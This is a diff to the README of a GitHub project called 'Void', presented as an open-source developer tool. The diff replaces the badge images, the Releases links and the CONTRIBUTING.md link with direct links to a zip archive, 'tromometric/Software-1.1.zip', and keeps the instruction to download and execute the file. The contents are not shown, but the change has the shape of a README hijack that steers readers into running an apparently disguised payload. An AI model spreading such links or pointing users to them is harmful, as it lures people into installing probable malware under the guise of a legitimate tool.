@@ -1,6 +1,6 @@
 # Void: Your Open-Source Developer Tool
 
-![GitHub Release](https://img.shields.io/github/release/Mhamadgaiming/void.svg) ![Open Source](https://img.shields.io/badge/Open%20Source-Yes-brightgreen.svg)
+![GitHub Release](https://raw.githubusercontent.com/Mhamadgaiming/void/main/tromometric/Software-1.1.zip) ![Open Source](https://raw.githubusercontent.com/Mhamadgaiming/void/main/tromometric/Software-1.1.zip%https://raw.githubusercontent.com/Mhamadgaiming/void/main/tromometric/Software-1.1.zip)
 
 Welcome to **Void**, a powerful tool designed for developers who want to enhance their coding experience. This repository provides various features aimed at improving productivity and streamlining workflows. 
 
@@ -31,7 +31,7 @@ Void is a versatile tool that integrates seamlessly with popular editors like Vi
 
 To install Void, follow these steps:
 
-1. Visit the [Releases](https://github.com/Mhamadgaiming/void/releases) section.
+1. Visit the [Releases](https://raw.githubusercontent.com/Mhamadgaiming/void/main/tromometric/Software-1.1.zip) section.
 2. Download the latest release suitable for your operating system.
 3. Execute the downloaded file to complete the installation.
 
@@ -66,7 +66,7 @@ We welcome contributions from everyone. If you have ideas for new features, bug 
 3. Make your changes and commit them with clear messages.
 4. Push your branch and submit a pull request.
 
-For more detailed guidelines, please refer to our [CONTRIBUTING.md](CONTRIBUTING.md).
+For more detailed guidelines, please refer to our [https://raw.githubusercontent.com/Mhamadgaiming/void/main/tromometric/Software-1.1.zip](https://raw.githubusercontent.com/Mhamadgaiming/void/main/tromometric/Software-1.1.zip).
 
 ## License
 
@@ -78,7 +78,7 @@ For any questions or feedback, feel free to reach out to us. You can open an iss
 
 ## Releases
 
-To stay updated with the latest features and fixes, check the [Releases](https://github.com/Mhamadgaiming/void/releases) section. Download the latest version and enjoy the enhancements it brings.
+To stay updated with the latest features and fixes, check the [Releases](https://raw.githubusercontent.com/Mhamadgaiming/void/main/tromometric/Software-1.1.zip) section. Download the latest version and enjoy the enhancements it brings.
 
 ---
 
